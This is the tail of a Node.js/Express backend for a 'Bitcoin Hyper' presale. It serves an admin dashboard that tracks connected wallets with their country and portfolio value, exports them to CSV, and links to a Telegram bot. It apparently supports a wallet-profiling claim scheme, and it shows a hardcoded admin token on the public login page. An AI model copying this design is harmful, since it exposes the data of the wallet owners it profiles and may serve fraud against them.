        background: linear-gradient(135deg, #8b5cf6 0%, #a78bfa 100%);
      }
      .title-section h1 {
        margin: 0;
        font-size: 32px;
        font-weight: 800;
        background: linear-gradient(135deg, #F7931A 0%, #FFD700 100%);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
      }
      .title-section p {
        margin: 4px 0 0 0;
        color: #94a3b8;
        font-size: 14px;
      }
      .stat-badge {
        display: inline-block;
        padding: 4px 12px;
        background: rgba(247, 147, 26, 0.1);
        border: 1px solid rgba(247, 147, 26, 0.3);
        border-radius: 20px;
        font-size: 12px;
        font-weight: 600;
        color: #F7931A;
      }
      .empty-state {
        text-align: center;
        padding: 60px 20px;
        color: #94a3b8;
      }
      .empty-state-icon {
        font-size: 48px;
        margin-bottom: 16px;
        opacity: 0.5;
      }
      @media (max-width: 768px) {
        .header {
          flex-direction: column;
          gap: 16px;
          text-align: center;
        }
        .header-buttons {
          flex-direction: column;
          width: 100%;
        }
        .header-buttons .btn {
          width: 100%;
        }
        th, td {
          padding: 12px;
          font-size: 14px;
        }
        .login-box {
          padding: 32px 24px;
        }
      }
    </style>
  </head>
  <body>
    <div id="app">
      <div class="login-container" id="loginScreen">
        <div class="login-box">
          <h2>🔐 Admin Login</h2>
          <form id="loginForm">
            <div class="form-group">
              <label>Admin Token</label>
              <input type="password" id="adminToken" required placeholder="Enter your admin token">
            </div>
            <button type="submit" class="btn">Login to Dashboard</button>
          </form>
          <p style="text-align: center; margin-top: 24px; color: #94a3b8; font-size: 12px;">
            Default token: BitcoinHyperAdmin2024!
          </p>
        </div>
      </div>
      
      <div class="container" id="dashboard" style="display: none;">
        <div class="header">
          <div class="title-section">
            <h1>₿ Bitcoin Hyper Admin</h1>
            <p>Real-time Presale Analytics Dashboard</p>
            <p style="font-size: 12px; color: #60a5fa; margin-top: 4px;">
              Last updated: <span id="lastUpdated">Just now</span>
            </p>
          </div>
          <div class="header-buttons">
            <button onclick="refreshStats()" class="btn refresh-btn">🔄 Refresh</button>
            <button onclick="exportData()" class="btn export-btn">📥 Export Data</button>
            <button onclick="logout()" class="btn btn-logout">Logout</button>
          </div>
        </div>
        
        <div class="stats-grid" id="statsGrid"></div>
        
        <div class="table-container">
          <h3 style="margin: 0; padding: 20px; border-bottom: 1px solid #475569; color: #f1f5f9;">
            Recent Participants (Last 24 Hours)
          </h3>
          <div style="overflow-x: auto;">
            <table>
              <thead>
                <tr>
                  <th>Wallet</th>
                  <th>Location</th>
                  <th>Portfolio</th>
                  <th>Eligible</th>
                  <th>Claimed</th>
                  <th>Token Amount</th>
                  <th>Connected</th>
                </tr>
              </thead>
              <tbody id="participantsTable">
                <tr><td colspan="7" class="empty-state">Loading data...</td></tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
    
    <script>
      const BACKEND_API = window.location.origin + '/api';
      let adminToken = null;
      let refreshInterval = null;
      
      document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        adminToken = document.getElementById('adminToken').value;
        localStorage.setItem('adminToken', adminToken);
        await loadDashboard();
      });
      
      // Check for saved token
      const savedToken = localStorage.getItem('adminToken');
      if (savedToken) {
        adminToken = savedToken;
        document.getElementById('adminToken').value = savedToken;
        loadDashboard();
      }
      
      async function loadDashboard() {
        try {
          showNotification('Loading dashboard...', 'info');
          
          const response = await fetch(BACKEND_API + '/admin/stats', {
            headers: { 'Authorization': 'Bearer ' + adminToken }
          });
          
          if (response.status === 401) {
            showNotification('Invalid admin token', 'error');
            localStorage.removeItem('adminToken');
            adminToken = null;
            return;
          }
          
          if (!response.ok) {
            throw new Error(\`HTTP \${response.status}\`);
          }
          
          const data = await response.json();
          
          if (data.success) {
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
            updateStats(data.stats);
            showNotification('Dashboard loaded successfully', 'success');
            
            // Auto-refresh every 60 seconds
            if (refreshInterval) clearInterval(refreshInterval);
            refreshInterval = setInterval(() => {
              refreshStats();
            }, 60000);
            
            updateLastUpdated();
          } else {
            throw new Error('Failed to load stats');
          }
        } catch (error) {
          showNotification(\`Failed to load dashboard: \${error.message}\`, 'error');
          console.error('Dashboard load error:', error);
        }
      }
      
      function updateStats(stats) {
        const statsGrid = document.getElementById('statsGrid');
        statsGrid.innerHTML = \`
          <div class="stat-card">
            <div class="stat-value">\${stats.totalParticipants.toLocaleString()}</div>
            <div class="stat-label">Total Participants</div>
            <div style="margin-top: 8px;">
              <span class="stat-badge">\${stats.eligibleParticipants} eligible</span>
            </div>
          </div>
          <div class="stat-card">
            <div class="stat-value">$\${stats.totalRaisedUSD.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
            <div class="stat-label">Total Raised</div>
            <div style="margin-top: 8px;">
              <span class="stat-badge">\${stats.claimedParticipants} claimed</span>
            </div>
          </div>
          <div class="stat-card">
            <div class="stat-value">\${Object.keys(stats.countries).length}</div>
            <div class="stat-label">Countries</div>
            <div style="margin-top: 8px; color: #94a3b8; font-size: 12px;">
              Top: \${Object.entries(stats.countries).sort((a,b) => b[1]-a[1])[0]?.[0] || 'N/A'}
            </div>
          </div>
          <div class="stat-card">
            <div class="stat-value">\${stats.recentConnections.length}</div>
            <div class="stat-label">Recent (24h)</div>
            <div style="margin-top: 8px; color: #94a3b8; font-size: 12px;">
              Active participants
            </div>
          </div>
        \`;
        
        const tableBody = document.getElementById('participantsTable');
        
        if (stats.recentConnections.length === 0) {
          tableBody.innerHTML = \`
            <tr>
              <td colspan="7" class="empty-state">
                <div class="empty-state-icon">📊</div>
                <div>No recent activity</div>
              </td>
            </tr>
          \`;
          return;
        }
        
        tableBody.innerHTML = stats.recentConnections.map(p => \`
          <tr>
            <td>
              <code title="\${p.wallet}">\${p.wallet.substring(0, 6)}...\${p.wallet.substring(38)}</code>
            </td>
            <td>
              \${p.country || 'Unknown'}
              \${p.country && p.country !== 'Unknown' ? '📍' : ''}
            </td>
            <td>\${p.portfolio ? '$' + parseFloat(p.portfolio).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2}) : '$0'}</td>
            <td>
              <span style="color: \${p.eligible ? '#10b981' : '#ef4444'}; font-weight: bold;">
                \${p.eligible ? '✅ Eligible' : '❌ Not Eligible'}
              </span>
            </td>
            <td>
              <span style="color: \${p.claimed ? '#10b981' : '#f59e0b'}; font-weight: bold;">
                \${p.claimed ? '✅ Claimed' : '⏳ Pending'}
              </span>
            </td>
            <td>\${p.amount} BTH</td>
            <td>\${formatTimeAgo(new Date(p.connected))}</td>
          </tr>
        \`).join('');
      }
      
      async function refreshStats() {
        try {
          const response = await fetch(BACKEND_API + '/admin/stats', {
            headers: { 'Authorization': 'Bearer ' + adminToken }
          });
          
          if (response.status === 401) {
            showNotification('Session expired', 'error');
            logout();
            return;
          }
          
          const data = await response.json();
          if (data.success) {
            updateStats(data.stats);
            updateLastUpdated();
          }
        } catch (error) {
          console.error('Refresh error:', error);
          showNotification('Failed to refresh data', 'error');
        }
      }
      
      async function exportData() {
        try {
          showNotification('Exporting data...', 'info');
          
          const response = await fetch(BACKEND_API + '/admin/export', {
            headers: { 'Authorization': 'Bearer ' + adminToken }
          });
          
          if (response.status === 401) {
            showNotification('Session expired', 'error');
            logout();
            return;
          }
          
          const data = await response.json();
          if (data.success) {
            // Create and download CSV
            const headers = Object.keys(data.data[0] || {});
            const csv = [
              headers.join(','),
              ...data.data.map(row => headers.map(header => 
                JSON.stringify(row[header] || '')
              ).join(','))
            ].join('\\n');
            
            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = \`bitcoin-hyper-export-\${new Date().toISOString().split('T')[0]}.csv\`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
            
            showNotification(\`Exported \${data.count} records successfully!\`, 'success');
          }
        } catch (error) {
          showNotification(\`Export failed: \${error.message}\`, 'error');
        }
      }
      
      function logout() {
        adminToken = null;
        localStorage.removeItem('adminToken');
        if (refreshInterval) clearInterval(refreshInterval);
        document.getElementById('dashboard').style.display = 'none';
        document.getElementById('loginScreen').style.display = 'flex';
        document.getElementById('adminToken').value = '';
        showNotification('Logged out successfully', 'info');
      }
      
      function showNotification(message, type = 'info') {
        // Remove existing notifications
        document.querySelectorAll('.notification').forEach(n => n.remove());
        
        const notification = document.createElement('div');
        notification.className = \`notification \${type}\`;
        notification.textContent = message;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
          notification.style.animation = 'slideOut 0.3s ease';
          setTimeout(() => {
            if (document.body.contains(notification)) {
              document.body.removeChild(notification);
            }
          }, 300);
        }, 4000);
      }
      
      function formatTimeAgo(date) {
        const seconds = Math.floor((new Date() - date) / 1000);
        
        if (seconds < 60) return 'Just now';
        if (seconds < 3600) return Math.floor(seconds / 60) + ' min ago';
        if (seconds < 86400) return Math.floor(seconds / 3600) + ' hours ago';
        return Math.floor(seconds / 86400) + ' days ago';
      }
      
      function updateLastUpdated() {
        document.getElementById('lastUpdated').textContent = new Date().toLocaleTimeString([], { 
          hour: '2-digit', 
          minute: '2-digit',
          second: '2-digit'
        });
      }
      
      // Initialize
      if (adminToken) {
        loadDashboard();
      }
    </script>
  </body>
  </html>
  `);
});

// ========== HOW TO GET TELEGRAM CHAT ID ==========

app.get('/api/telegram/chatid', async (req, res) => {
  if (!process.env.TELEGRAM_BOT_TOKEN) {
    return res.json({
      success: false,
      message: 'Telegram bot token not configured'
    });
  }
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/getUpdates`);
    
    if (response.data.ok && response.data.result.length > 0) {
      const chatIds = [];
      response.data.result.forEach(update => {
        if (update.message && update.message.chat) {
          chatIds.push({
            id: update.message.chat.id,
            type: update.message.chat.type,
            title: update.message.chat.title || update.message.chat.first_name,
            username: update.message.chat.username
          });
        }
      });
      
      const uniqueChatIds = chatIds.filter((chat, index, self) =>
        index === self.findIndex((t) => t.id === chat.id)
      );
      
      return res.json({
        success: true,
        chatIds: uniqueChatIds,
        instructions: 'Use one of these chat IDs in your TELEGRAM_CHAT_ID environment variable'
      });
    } else {
      return res.json({
        success: false,
        message: 'No messages received yet. Send a message to your bot first.',
        instructions: '1. Start a chat with your bot on Telegram\n2. Send any message\n3. Refresh this page'
      });
    }
  } catch (error) {
    return res.json({
      success: false,
      message: 'Error fetching updates',
      error: error.message,
      instructions: 'Make sure your bot token is correct and the bot is running'
    });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({
    success: false,
    error: 'Internal server error',
    message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
  });
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found',
    message: `The requested endpoint ${req.originalUrl} does not exist`
  });
});

// Start server
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`
  🚀 BITCOIN HYPER BACKEND v2.0.0
  ================================
  📍 Port: ${PORT}
  🔗 Health: http://localhost:${PORT}/api/health
  📊 Admin: http://localhost:${PORT}/admin
  🤖 Telegram ID: http://localhost:${PORT}/api/telegram/chatid
  🔐 Admin Token: ${process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!'}
  `);
  
  // Initialize Telegram bot after server starts
  setTimeout(() => {
    initializeTelegramBot();
  }, 2000);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received. Shutting down gracefully...');
  server.close(() => {
    console.log('Server closed.');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('SIGINT received. Shutting down...');
  server.close(() => {
    console.log('Server closed.');
    process.exit(0);
  });
});

module.exports = app;

